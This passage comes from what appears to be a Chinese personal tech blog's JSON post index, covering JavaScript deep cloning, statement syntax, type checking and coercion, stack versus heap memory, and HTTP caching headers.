Symbol]&#x27;;const errorTag = &#x27;[object Error]&#x27;;const regexpTag = &#x27;[object RegExp]&#x27;;const funcTag = &#x27;[object Function]&#x27;;const deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];function forEach(array, iteratee) &#123; let index = -1; const length = array.length; while (++index &lt; length) &#123; iteratee(array[index], index); &#125; return array;&#125;function isObject(target) &#123; const type = typeof target; return target !== null &amp;&amp; (type === &#x27;object&#x27; || type === &#x27;function&#x27;);&#125;function getType(target) &#123; return Object.prototype.toString.call(target);&#125;function getInit(target) &#123; const Ctor = target.constructor; return new Ctor();&#125;function cloneSymbol(targe) &#123; return Object(Symbol.prototype.valueOf.call(targe));&#125;function cloneReg(targe) &#123; const reFlags = /\\w*$/; const result = new targe.constructor(targe.source, reFlags.exec(targe)); result.lastIndex = targe.lastIndex; return result;&#125;function cloneFunction(func) &#123; const bodyReg = /(?&lt;=&#123;)(.|\\n)+(?=&#125;)/m; const paramReg = /(?&lt;=\\().+(?=\\)\\s+&#123;)/; const funcString = func.toString(); if (func.prototype) &#123; const param = paramReg.exec(funcString); const body = bodyReg.exec(funcString); if (body) &#123; if (param) &#123; const paramArr = param[0].split(&#x27;,&#x27;); return new Function(...paramArr, body[0]); &#125; else &#123; return new Function(body[0]); &#125; &#125; else &#123; return null; &#125; &#125; else &#123; return eval(funcString); &#125;&#125;function cloneOtherType(targe, type) &#123; const Ctor = targe.constructor; switch (type) &#123; case boolTag: case numberTag: case stringTag: case errorTag: case dateTag: return new Ctor(targe); case regexpTag: return cloneReg(targe); case symbolTag: return cloneSymbol(targe); case funcTag: return cloneFunction(targe); default: return null; &#125;&#125;function clone(target, map = new WeakMap()) &#123; // 克隆原始类型 if (!isObject(target)) &#123; return target; &#125; // 初始化 const type = getType(target); let cloneTarget; if (deepTag.includes(type)) &#123; cloneTarget = getInit(target, type); &#125; else &#123; return cloneOtherType(target, type); &#125; // 防止循环引用 if (map.get(target)) &#123; return map.get(target); &#125; map.set(target, cloneTarget); // 克隆set if (type === setTag) &#123; target.forEach(value =&gt; &#123; cloneTarget.add(clone(value, map)); &#125;); return cloneTarget; &#125; // 克隆map if (type === mapTag) &#123; target.forEach((value, key) =&gt; &#123; cloneTarget.set(key, clone(value, map)); &#125;); return cloneTarget; &#125; // 克隆对象和数组 const keys = type === arrayTag ? undefined : Object.keys(target); forEach(keys || target, (value, key) =&gt; &#123; if (keys) &#123; key = value; &#125; cloneTarget[key] = clone(target[key], map); &#125;); return cloneTarget;&#125;module.exports = &#123; clone&#125;;","categories":[{"name":"JavaScript 编程题","slug":"JavaScript-编程题","permalink":"https://xuxb.github.io/categories/JavaScript-%E7%BC%96%E7%A8%8B%E9%A2%98/"}],"tags":[{"name":"编程题","slug":"编程题","permalink":"https://xuxb.github.io/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/"}]},{"title":"语法","slug":"JavaScript/语法","date":"2021-01-29T06:24:48.000Z","updated":"2021-05-05T08:53:23.579Z","comments":true,"path":"2021/01/29/JavaScript/语法/","link":"","permalink":"https://xuxb.github.io/2021/01/29/JavaScript/%E8%AF%AD%E6%B3%95/","excerpt":"","text":"语法1. 语句每个语句都有一个结果值（如 undefined） 代码块 &#123; .. &#125; 的结果值是其最后一个语句或表达式的结果 ECMAScript 规范定义 var 语句的结果值是 undefined 语法不允许我们获得语句的结果值并将其赋值给另一个变量（至少目前不行） 2. 表达式的副作用123456var a, b, c;a = b = c = 42;// 这里 c = 42 的结果值为 42 （副作用是将 c 赋值 42 ），// 然后 b = 42 的结果值为 42 （副作用是将 b 赋值 42 ），// 最后是 a = 42 （副作用是将 a 赋值 42 ） 12345678910var a = &#123; n: 1 &#125;;var b = a;a.x = a = &#123; n: 2 &#125;;console.log(a.x); // undefinedconsole.log(b.x); // &#123; n: 2 &#125;// --- 解释 ---// 赋值操作是从右至左的，但 `.` 的优先级比 `=` 高// 对于第三行代码，会先执行 a.x，即给 `&#123; n: 1 &#125;` 对象新增一个 x 属性，然后执行 `a = &#123; n: 2 &#125;` 后 a 指向新对象 `&#123; n: 2 &#125;`，且此操作的返回值为 `&#123; n: 2 &#125;`，最后再执行 `a.x = _result_` 时，并不会重新解析一遍 `a`，而是沿用最初的解析 `&#123; n: 1 &#125;` ，故旧对象 `&#123; n: 1 &#125;` 的 `x` 属性的值为 `&#123; n: 2 &#125;` 3. 标签语句标签语句：实现类似 goto 的功能，用于控制循环的跳转（并不推荐使用） continue 和 break 语句都可以带一个标签 12345678910111213141516171819// `contine foo` 指执行foo 循环的下一轮循环foo: for (var i = 0; i &lt; 4; i++) &#123; for (var j = 0; j &lt; 4; j++) &#123; if (j == i) &#123; // 如果j和i相等，继续外层循环 continue foo; // 跳转到foo的下一个循环 &#125; if ((j * i) % 2 == 1) &#123; // 跳过奇数结果 continue; // 继续内层循环（没有标签的） &#125; console.log(i, j); &#125;&#125;// ------ output ------// 1 0// 2 0// 2 1// 3 0// 3 2 **Note: ** switch...case... 语句中使用严格相等进行比较，如需使用非严格相等，可使用 switch (true) &#123; case (a == 1)... &#125; 由于浏览器演进的历史遗留问题，在创建带有 id 属性的 DOM 元素时也会创建同名的全局变量","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"数据类型与类型转换","slug":"JavaScript/数据类型与类型转换","date":"2021-01-27T04:32:18.000Z","updated":"2021-06-01T11:40:56.734Z","comments":true,"path":"2021/01/27/JavaScript/数据类型与类型转换/","link":"","permalink":"https://xuxb.github.io/2021/01/27/JavaScript/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/","excerpt":"","text":"1、数据类型八种数据类型：null 、 undefined 、 boolean 、 number 、 string 、 symbol、bigint 和 object 12345678910111213typeof undefined === &#x27;undefined&#x27;; // truetypeof true === &#x27;boolean&#x27;; // truetypeof 42 === &#x27;number&#x27;; // truetypeof &#x27;42&#x27; === &#x27;string&#x27;; // truetypeof &#123; life: 42 &#125; === &#x27;object&#x27;; // truetypeof [1] === &#x27;object&#x27;; // true// 历史遗留问题typeof null === &#x27;object&#x27;; // true// ES6中新加入的类型typeof Symbol() === &#x27;symbol&#x27;; // truetypeof 12n === &#x27;bigint&#x27; // true 1.1 类型判断1.1.1 typeoftypeof 命令可以判断 Undefined, Boolean, String, Number, Symbol, BigInt 等基本数据类型，但无法判断 Null，Object, Array 等对象类型 123typeof null === &#x27;object&#x27;; // truetypeof &#123;&#125; === &#x27;object&#x27;; // truetypeof [] === &#x27;object&#x27;; // true 1.1.2 instanceof （不推荐使用）适合用于判断自定义的类实例对象, 而不是用来判断原生的数据类型，会有一些问题，不推荐使用 实质上是通过 constructor 字段来判断的，会逐层的在原型链上查找 iframe 之间不会共享原型链，通过 iframe 传值时，使用 instanceof 会有问题 123var arr = []arr instanceof Array // truearr instanceof Object // true 1.1.3 Object.prototype.toString() （推荐使用）Object.prototype.toString 方法, 可以获取到变量的准确的类型 Object.prototype.toString 的原理是当调用的时候, 就取值内部的 [[Class]] 属性值, 然后拼接成 &#39;[object &#39; + [[Class]] + &#39;]&#39; 这样的字符串并返回 123456789101112const fn = () =&gt; &#123;&#125;;const toString = Object.prototype.toString;toString.call(undefined); // [object Undefined]toString.call(null); // [object Null]toString.call(true); // [object Boolean]toString.call(1); // [object Number]toString.call(NaN); // [object Number]toString.call(&#x27;1&#x27;); // [object String]toString.call(fn); // [object Function]toString.call([1,2,3]); // [object Array] 1234567891011// 实现 typeof 函数判断所有数据类型const typeOf = (obj) =&gt; &#123; const regex = /\\[object\\s(.+)]/; const objStr = Object.prototype.toString.call(obj); const res = objStr.match(regex); console.log(res); if (!res || !res[1]) throw new Error(&#x27;typeof error&#x27;); return res[1].toLowerCase();&#125; 1.1.4 其他 APIArray.isArray() 用于判断某个数据是否为数组， polyfill 实现如下： 123Array.isArray = Array.isArray || function(array)&#123; return Object.prototype.toString.call(array) === &#x27;[object Array]&#x27;;&#125; Number.isNaN() 方法确定传递的值是否为 NaN，并且检查其类型是否为 Number。 polyfill 实现如下： 123Number.isNaN = Number.isNaN || function(value) &#123; return typeof value === &quot;number&quot; &amp;&amp; isNaN(value);&#125; isNaN() 方法用来确定一个值是否为 NaN，因为 NaN !== NaN 将某些不能强制转换为数值的非数值转换为数值，或者算术运算返回一个未定义的或无法表示的值，会得到 NaN如果 isNaN 函数的参数不是 Number 类型， isNaN 函数会首先尝试将这个参数转换为数值，然后才会对转换后的结果是否是 NaN 进行判断，推荐使用 Number.isNaN() 1234var isNaN = function(value) &#123; var n = Number(value); return n !== n;&#125;; 1.2 undefined 与 undeclared 未被声明的变量，如 b，调用时报错 ReferenceError: b is not defined 已被声明但未赋值的变量，如 let a， 直接调用时输出 undefined typeof 有一个特殊的安全防范机制，变量未被声明时也返回 undefined 1234567const &#123; log &#125; = consolevar a;log(a); // undefinedlog(b); // ReferenceError: b is not definedlog(typeof a); // undefinedlog(typeof b); // undefined 1.3 机器精度比较两个浮点数最常见的方法是设置一个误差范围值，通常称为“机器精度”，对 JavaScript 的数字来说，这个值通常是 2^-52 (2.220446049250313e-16) 。 123456789101112// 为 ES6 之前的版本写 polyfillif (!Number.EPSILON) &#123; Number.EPSILON = Math.pow(2, -52);&#125;function numbersCloseEnoughToEqual(n1,n2) &#123; return Math.abs( n1 - n2 ) &lt; Number.EPSILON;&#125;var a = 0.1 + 0.2;var b = 0.3;numbersCloseEnoughToEqual(a, b); // truenumbersCloseEnoughToEqual(0.0000001, 0.0000002); // false 1234567891011121314151617181920212223242526// Q: 去数值的整数部分和小数部分// A: 使用 parseInt// 不推荐使用，不准确 &amp; 性能问题var a = 3.5parseInt(a) // 3var b = 0.0000000000001 // 1e-13parseInt(b) // 1// A: 使用 Math.ceil()、Math.floor()function trunc(num) &#123; if(num &gt;= 0) return Math.floor(num); return Math.ceil(num);&#125;trunc(3.75); // 3trunc(-3.75); // -3// A: 使用 % 运算console.log(3.75 % 1); // 0.75console.log(-3.75 % 1); // -0.75// A: 使用位运算console.log(~~3.75); // 3console.log(~~-3.75); // -3 todo: 取整数部分和小数部分2、对象、字符串、数字和布尔值之间类型转换规则2.1 内部属性 [[class]]所有 typeof 返回值为 &quot;object&quot; 的对象都包含一个内部属性 [[Class]] （看作一个内部的分类），这个属性无法直接访问，一般通过 Object.prototype.toString() 来查看 123456const toString = Object.prototype.toString;toString.call(null); // [object Null]toString.call(undefined); // [object Undefined]toString.call(true); // [object Boolean]toString.call([]); // [object Array] 2.2 toStringTagSymbol.toStringTag 是一个内置 symbol，它通常作为对象的属性键使用，对应的属性值应该为字符串类型，这个字符串用来表示该对象的自定义类型标签，通常只有内置的 Object.prototype.toString() 方法会去读取这个标签并把它包含在自己的返回值里。 许多内置的 JavaScript 对象类型即便没有 toStringTag 属性，也能被 toString() 方法识别并返回特定的类型标签，比如： 1234567Object.prototype.toString.call(&#x27;foo&#x27;); // &quot;[object String]&quot;Object.prototype.toString.call([1, 2]); // &quot;[object Array]&quot;Object.prototype.toString.call(3); // &quot;[object Number]&quot;Object.prototype.toString.call(true); // &quot;[object Boolean]&quot;Object.prototype.toString.call(undefined); // &quot;[object Undefined]&quot;Object.prototype.toString.call(null); // &quot;[object Null]&quot;// ... and more 另外一些对象类型则不然，toString() 方法能识别它们是因为引擎为它们设置好了 toStringTag 标签： 1234Object.prototype.toString.call(new Map()); // &quot;[object Map]&quot;Object.prototype.toString.call(function* () &#123;&#125;); // &quot;[object GeneratorFunction]&quot;Object.prototype.toString.call(Promise.resolve()); // &quot;[object Promise]&quot;// ... and more 但你自己创建的类不会有这份特殊待遇，toString() 找不到 toStringTag 属性时只好返回默认的 Object 标签： 123class ValidatorClass &#123;&#125;Object.prototype.toString.call(new ValidatorClass()); // &quot;[object Object]&quot; 加上 toStringTag 属性，你的类也会有自定义的类型标签了： 1234567class ValidatorClass &#123; get [Symbol.toStringTag]() &#123; return &quot;Validator&quot;; &#125;&#125;Object.prototype.toString.call(new ValidatorClass()); // &quot;[object Validator]&quot; 2.3 ToPrimitive 抽象操作ToPrimitive(input, PreferredType) 是JavaScript引擎内部的抽象操作，原理如下：可选参数 PreferredType 可以是 Number 或者 String，它只代表了一个转换的偏好，转换结果不一定必须是这个参数所指的类型，但转换结果一定是一个原始值。 PreferredType 被标志为 Number 时： 如果输入的值已经是个原始值，则直接返回它 如果输入的值是一个对象，则调用该对象的 valueOf() 方法，如果 valueOf() 方法的返回值是一个原始值，则返回这个原始值 否则，调用这个对象的 toString() 方法，如果 toString() 方法的返回值是一个原始值，则返回这个原始值 否则，抛出 TypeError 异常 PreferredType 被标志为 String 时转换规则类似，不同的是先调用 toString() 方法，再调用 valueOf() 方法 如果没有 PreferredType 参数，则 PreferredType 的值会按照这样的规则来自动设置：Date 类型的对象会被设置为 String，其它类型的值会被设置为 Number（先调用 valueOf） 1234567891011121314151617181920var obj = &#123; valueOf () &#123; console.log(&#x27;valueOf&#x27;); return &#123;&#125;; &#125;, toString () &#123; console.log(&#x27;toString&#x27;); return &#123;&#125;; &#125;,&#125;Number(obj);// valueOf// toString// TypeError: Cannot convert object to primitive valueString(obj);// toString// valueOf// TypeError: Cannot convert object to primitive value 类型 valueOf() toString() Boolean true 或 false ‘true’或者 ‘false’ Number 数值 数值的字符串形式 String 返回该对象表示的字符串值 返回该对象表示的字符串值 Object 返回该对象 ‘[object Object]’ Array 返回该数组 以,分割的字符串，类似Array.join(‘,’) Date 返回日期的毫秒数 返回带有时区信息的日期和时间 RegExp 返回该正则函数 返回正则表达式字面量 Function 返回该函数 将函数代码以字符串形式返回 3 类型转换3.1 ToNumbernumber 转换规则： true 转换为 1 false 转换为 0 ， undefined 转换为 NaN null 转换为 0 字符串转为数字 为了将值转换为相应的基本类型值，抽象操作 ToPrimitive 会首先检查该值是否有 valueOf() 方法，如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 toString() 的返回值（如果存在）来进行强制类型转换，否则会产生 TypeError 错误。 1234567891011121314151617181920var a = &#123; valueOf() &#123; return &quot;42&quot;; &#125;&#125;;var b = &#123; toString() &#123; return &quot;42&quot;; &#125;&#125;;var c = [4, 2];c.toString = function () &#123; return this.join(&quot;&quot;);&#125;;Number(a); // 42Number(b); // 42Number(c); // 42Number(&quot;&quot;); // 0Number([]); // 0Number([&quot;abc&quot;]); // NaN 3.2 ToString字符串化规则： null 转换为 &quot;null&quot; undefined 转换为 &quot;undefined&quot; true 转换为 &quot;true&quot;， 数字转换为普通字符串（较大或较小数值使用指数形式） 普通对象使用 toString() （ Object.prototype.toString() ）返回内部属性 [[Class]] 的值，如 &quot;[object Object]&quot;。 如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值数组的默认 toString() 方法经过了重新定义，将所有单元字符串化以后再用 “,” 连接 12345678910111213141516171819202122var num = &#x27;123456789&#x27;;var flag = true;var n = null;var u = undefined;var obj = &#123; name: &#x27;xxb&#x27; &#125;;var obj2 = &#123; name: &#x27;xxb&#x27;, toString() &#123; return this.name + &#x27;-------&#x27;; &#125;&#125;var arr = [1, 2, 3];var error = new Error(&#x27;123&#x27;);num.toString(); // 123456789flag.toString(); // truen + &#x27;&#x27;; // nullu + &#x27;&#x27;; // undefinedobj.toString(); // [object Object]obj2.toString(); // xxb-------arr.toString(); // 1,2,3error.toString(); // Error: 123 3.3 ToBooleanundefined、null、false、+0 、 -0 和 NaN、&quot;&quot; 将转换为 false，其他值转换为 true 所有的对象都会转换为 true，包括{}、new Boolean(false)、new Number(0)、new String(‘’) 12345678910!! null // false!! &#x27;&#x27; // false!!NaN // false!!new Boolean(false) // true!!new Number(0); // true!!new String(&quot;&quot;); // true!! &quot;false&quot;; // true!! &quot;0&quot;; // true!! &quot;&#x27;&#x27;&quot;; // true!!&#123;&#125;; // true 字符串和数字之间的转换是通过 String(..) 和 Number(..) 这两个内建函数（原生构造函数，参见第 3 章）来实现的，请注意它们前面没有 new 关键字，并不创建封装对象。~ 和 indexOf() 一起可以将结果强制类型转换（实际上仅仅是转换）为真 / 假值~ 比 &gt;= 0 和 == -1 更简洁 3.4 JSON 字符串化 字符串、数字、布尔值和 null 的 JSON.stringify() 规则与 ToString 基本相同。 如果传递给 JSON.stringify() 的对象中定义了 toJSON() 方法，那么该方法会在字符串化前调用，以便将对象转换为安全的 JSON 值。 所有安全的 JSON 值都可以使用 JSON.stringify() 字符串化。 不安全的 JSON 值指 undefined 、 function 、 symbol和包含循环引用的对象，JSON.stringify() 在对象中遇到 undefined 、 function 和 symbol 时会自动将其忽略，在数组中则会返回 null （以保证单元位置不变） 如果对象中定义了 toJSON() 方法，JSON 字符串化时会首先调用该方法，然后用它的返回值来进行序列化。如果要对含有非法 JSON 值的对象做字符串化，或者对象中的某些值无法被序列化时，就需要定义 toJSON() 方法来返回一个安全的 JSON 值。 toJSON() 返回的应该是一个适当的值，可以是任何类型，然后再由 JSON.stringify() 对其进行字符串化 12345678910111213JSON.stringify(undefined); // undefinedJSON.stringify(function()&#123;&#125;); // undefinedJSON.stringify([1, undefined, function()&#123;&#125;, 4]); // &quot;[1,null,null,4]&quot;JSON.stringify(&#123; a:2, b:function()&#123;&#125;&#125;); // &quot;&#123;&quot;a&quot;:2&#125;&quot;var obj = &#123; name: &#x27;xxb&#x27;, age: 24, toJSON () &#123; return this.name; &#125;&#125;JSON.stringify(undefined); // &quot;xxb&quot; 4 隐式转换4.1 隐式强制转换为 String+ 运算符即能用于数字加法，也能用于字符串拼接， + 运算符也能是一元运算符，将后面的操作数转换为数字 ES5 规范定义：如果某个操作数是字符串或者能够通过以下步骤转换为字符串的话，+ 将进行拼接操作。如果其中一个操作数是对象（包括数组），则首先对其调用 ToPrimitive 抽象操作，该抽象操作再调用 [[DefaultValue]] ，以数字作为上下文。 其中一个操作数是字符串（或者通过 ToPrimitive 得到字符串），则执行字符串拼接，否则执行数字加法 12345678910111213var a = &#123; valueOf: function () &#123; return 42; &#125;, toString: function () &#123; return 4; &#125;&#125;;a + &quot;&quot;; // &quot;42&quot;String(a); // &quot;4&quot;// a + &quot;&quot; 会对 a 调用 valueOf() 方法，然后通过 ToString 抽象操作将返回值转换为字符串。// String(a) 则是直接调用 ToString() 123456789101112[1, 2] + [3, 4] // &#x27;1,23,4&#x27;42 + &#x27;&#x27; // &#x27;42&#x27;[] + &#123;&#125; // &#x27;[object Object]&#x27;&#123; &#125; +[] // 0 `&#123;&#125;` 被当做代码块 + &#x27;42&#x27; // 42&#x27;42&#x27; - 0 // 42&#x27;42&#x27; - &#x27;12&#x27; // 32[32] - [21] // 11 [32] - [2, 1] // NaN 隐式强制转换为 Number123456789101112// boolean 转换为 number// 也可使用 Number(boolean) 进行隐式转换function booleanToNum() &#123; let sum = 0; for (let i = 0; i &lt; arguments.length; i++) &#123; if (arguments[i]) &#123; sum += 1; &#125; &#125; return sum;&#125;booleanToNum(true, false, true) 隐式强制转换为Boolean下面的情况会发生隐式强制类型 Boolean 转换： if (..) 语句中的条件判断表达式。 for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。 while (..) 和 do..while(..) 循环中的条件判断表达式。 ? :中的条件判断表达式。 逻辑运算符 || （逻辑或）和 &amp;&amp; （逻辑与）左边的操作数（作为条件判断表达式）。 var a = 42; var b = &quot;abc&quot;; var c; var d = null; if (a) &#123; console.log(&quot;yep&quot;); // yep &#125; while (c) &#123; console.log(&quot;nope, never runs&quot;); &#125; c = d ? a : b; c; // &quot;abc&quot; if ((a &amp;&amp; d) || c) &#123; console.log(&quot;yep&quot;); // yep &#125;```","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"栈内存与堆内存","slug":"JavaScript/栈内存与堆内存","date":"2021-01-27T04:24:48.000Z","updated":"2021-04-30T06:15:50.732Z","comments":true,"path":"2021/01/27/JavaScript/栈内存与堆内存/","link":"","permalink":"https://xuxb.github.io/2021/01/27/JavaScript/%E6%A0%88%E5%86%85%E5%AD%98%E4%B8%8E%E5%A0%86%E5%86%85%E5%AD%98/","excerpt":"","text":"栈内存与堆内存1、栈内存概念：存放基本类型的变量和对象的引用，比如 boolean、string、number 等，分配在栈内存区。 特点： 存取速度较快 数据可以共享 生命周期固定，缺乏灵活性 2、堆内存概念：存放复杂数据类型（引用类型），比如 Object、 Array 等，系统不知道需要多大空间，需程序自己申请，分配在堆内存区。 特点： 存取速度较慢 存放大量数据，每份数据的地址都不一样（通过 new 方式创建） 3、为什么区分栈内存和堆内存？通常与垃圾回收机制有关，为了使程序运行时占用的内存最小。 当一个方法执行时，每个方法都会建立自己的内存栈，在这个方法内定义的变量将会逐个放入这块栈内存里，随着方法的执行结束，这个方法的内存栈也将自然销毁了。因此，所有在方法中定义的变量都是放在栈内存中的； 当我们在程序中创建一个对象时，这个对象将被保存到运行时数据区中，以便反复利用（因为对象的创建成本通常较大），这个运行时数据区就是堆内存。堆内存中的对象不会随方法的结束而销毁，即使方法结束后，这个对象还可能被另一个引用变量所引用（方法的参数传递时很常见）， 则这个对象依然不会被销毁，只有当一个对象没有任何引用变量引用它时，系统的垃圾回收机制才会在核实的时候回收它。 栈使用的是一级缓存， 通常都是被调用时处于存储空间中，调用完毕立即释放堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定，调用的速度要相对来得低一些 4、调用栈概念：函数中的 调用栈（call stack） 指由 栈帧￼（stack frame） 或叫 活动记录（activation record）构成的栈 函数调用的局部状态中的数据存活时间满足 “后入先出”（LIFO）顺序，与算法中的栈结构有相同的机制，所以叫做调用栈。 对于同步调用的函数，其调用逻辑是递归的，被调用者的局部信息所占空间的分配总是后于调用者的（后入），而其释放则总是先于调用者的（先出），所以使用栈结构是最简捷的一种方式（不一定必须用栈） 12345678910111213141516main() a() b() c() - main() | +&gt; - a() . | . +&gt; - b() . . | . . +&gt; - c() . . . | . . + &lt;- return from c() . . | . + &lt;- return from b() . | + &lt;- return from a() | - return from main() 算法中的栈、堆、队列栈：一种后进先出的的数据结构队列：一种先进先出的的数据结构堆：可以被看成是一棵树，如：堆排序","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://xuxb.github.io/categories/JavaScript/"}],"tags":[{"name":"JavaScript 原理","slug":"JavaScript-原理","permalink":"https://xuxb.github.io/tags/JavaScript-%E5%8E%9F%E7%90%86/"}]},{"title":"HTTP 缓存","slug":"HTTP/HTTP 缓存","date":"2021-01-14T07:45:00.000Z","updated":"2021-04-30T07:17:49.980Z","comments":true,"path":"2021/01/14/HTTP/HTTP 缓存/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTP%20%E7%BC%93%E5%AD%98/","excerpt":"","text":"HTTP 缓存1、强缓存说明：强缓存直接从浏览器缓存中获取，不发送请求到服务器使用：用Cache-Control、 Expires 头信息 1.1 强缓存相关头信息 Cache-Control: HTTP/1.1 标准， 使用相对时间（从生成文档开始计时，推荐使用，优先级高于 Expires） Expires：HTTP/1.0 标准，使用绝对时间（依赖计算器本地时间，可能不准确） 123456789&#x2F;&#x2F; Request Header If-None-Match: &quot;2a043f-6741-5456e5e0050c3&quot; If-Modified-Since: Fri, 06 Jan 2017 15:06:49 GMT&#x2F;&#x2F; Response Header Cache-Control: max-age&#x3D;2592000 Expires: Sat, 18 Feb 2017 08:31:00 GMT ETag: &quot;2a043f-6741-5456e5e0050c3&quot;Last-Modified: Fri, 06 Jan 2017 15:06:49 GMT 1.2 Cache-Control 头信息字段 Cache-directive 说明 private 私有缓存，即内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存)，默认为 private public 公有缓存，即所有内容都将被缓存(客户端和代理服务器都可缓存) no-store 禁止进行缓存，即所有内容都不会被缓存到缓存或 Internet 临时文件中 no-cache 强制确认缓存，即必须先与服务器确认返回的响应是否被更改（该请求应该会带有与本地缓存相关的验证字段），然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。 must-revalidation/proxy-revalidation 过期校验缓存，即超过设定的过期时间后会重新检验新鲜度，通常与 max-age 配合使用，如果缓存的内容失效，请求必须发送到服务器/代理以进行重新验证 immutable 不可变的缓存，即表示该资源是不可变的（如资源名称加了指纹信息，md5 戳等），不用重新验证新鲜度，所以不必向服务器发送请求，直接从缓存中获取，也可设置 max-age 为过期时间 max-age=xxx 缓存的内容将在 xxx 秒后失效, 这个选项只在 HTTP 1.1可用, 并如果和 Last-Modified 一起使用时, 优先级较高 stale-while-revalidate 提供的是一个宽限期（由 max-age=xxx ），当检查新版本时，允许浏览器在这段宽限期期间使用过期的（旧的）资源 stale-if-error 如果重新验证资源时返回了 5xx 之类的错误，stale-if-error 会给浏览器一个使用旧的响应的宽限期 Clear-Site-Data：实验性质的响应头，表示清除当前请求网站有关的浏览器数据（cookie，存储，缓存），可选值为 cache、cookies、storage 或 *，如登出时可设置响应头为 Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;, &quot;storage&quot; 通常情况下，因为访问页面的 url 不能改变，所以不对 html 文件作缓存处理，可设置 Cache-Control: max-age=0，对于 js、css 等经常改变且含指纹信息的资源，可设置 Cache-Control: public, max-age=31536000000 1.3 缓存校验 用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有 “Cache-control: must-revalidate” 的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced-&gt;Cache为强制验证缓存也能达到相同的效果。当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。 作为缓存的一种强校验器，ETag 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 If-None-Match 头来验证缓存。Last-Modified 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。 2、协商缓存说明：先发送请求给服务器，如果命中缓存，则从浏览器缓存中获取使用：用 Last-Modificd 和 If-Modificd-Since、Etag 和 If-None-Match 头信息 分布式系统里多台机器间文件的 last-modified 必须保持一致，以免负载均衡到不同机器导致比对失败 分布式系统尽量关闭掉 Etag (每台机器生成的 Etag 都会不一样) Etag: 实体标签（版本标识符），用于表示文档的版本号、序列号、内容校验或指纹信息，表明文档是否被修改 Last-Modified 标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间，如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存，有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。 Etag、If-None-Match Etag：web 服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。 If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。 Last-Modified、If-Modified-Since Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉客户端资源的最后修改时间。 If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），则响应HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省流量)，告知浏览器继续使用所保存的cache。 3、其他 新鲜度 理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做缓存驱逐。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端及其缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的。驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个If-None-Match头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 304 (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。 对于含有特定头信息的请求，会去计算缓存寿命。比如Cache-control: max-age=N的请求头，相应的缓存的寿命就是N。通常情况下，对于不含这个属性的请求则会去查看是否包含Expires属性，通过比较Expires的值和头里面Date属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的Last-Modified信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%） 资源加速 